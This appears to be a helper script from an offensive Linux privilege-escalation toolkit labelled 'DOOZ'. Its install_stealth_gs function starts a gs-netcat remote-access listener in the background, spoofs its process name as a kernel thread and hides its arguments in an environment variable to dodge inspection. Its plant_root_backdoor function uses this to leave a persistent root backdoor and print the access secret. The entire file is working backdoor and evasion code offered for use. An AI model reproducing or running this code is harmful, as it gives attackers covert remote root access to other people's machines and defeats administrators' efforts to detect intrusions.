#!/bin/bash
# DOOZ Common - LPE helpers

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
GOLD='\033[0;33m'
NC='\033[0m'

success() { echo -e "${GREEN}[+]${NC} $*"; }
fail() { echo -e "${RED}[-]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
info() { echo -e "${GOLD}[*]${NC} $*"; }

is_root() { [ "$(id -u)" -eq 0 ]; }

# SUPERIOR stealth GSSocket install
# Key: Uses GS_ARGS env var - hides arguments from /proc/cmdline!
install_stealth_gs() {
    local secret="${1:-}"
    local gs_bin=""
    
    # Find binary
    for loc in "$(command -v gs-netcat 2>/dev/null)" "/usr/bin/gs-netcat" "$HOME/.config/htop/defunct" "/var/www/monitor-server/defunct"; do
        [ -x "$loc" ] 2>/dev/null && gs_bin="$loc" && break
    done
    
    [ -z "$gs_bin" ] && return 1
    
    # Generate secret
    [ -z "$secret" ] && secret=$("$gs_bin" -g 2>/dev/null || head -c 12 /dev/urandom | xxd -p)
    
    # STEALTH: Use GS_ARGS env var instead of cmdline!
    # This makes process show as just "[kworker/0:0]" without any arguments
    local names=("[kworker/0:0]" "[migration/0]" "[ksoftirqd/0]" "[watchdog/0]" "[kswapd0]")
    local name="${names[$((RANDOM % ${#names[@]}))]}"
    
    (
        cd /tmp 2>/dev/null || cd /
        # KEY: Arguments in env var, not cmdline!
        export GS_ARGS="-s $secret -liqD"
        export TERM=xterm-256color
        exec -a "$name" "$gs_bin" </dev/null >/dev/null 2>&1
    ) &
    disown 2>/dev/null
    
    echo "$secret"
}

plant_root_backdoor() {
    is_root || return 1
    local secret=$(install_stealth_gs)
    [ -n "$secret" ] && {
        success "ROOT BACKDOOR PLANTED!"
        echo "ROOT_SECRET:$secret"
    }
}
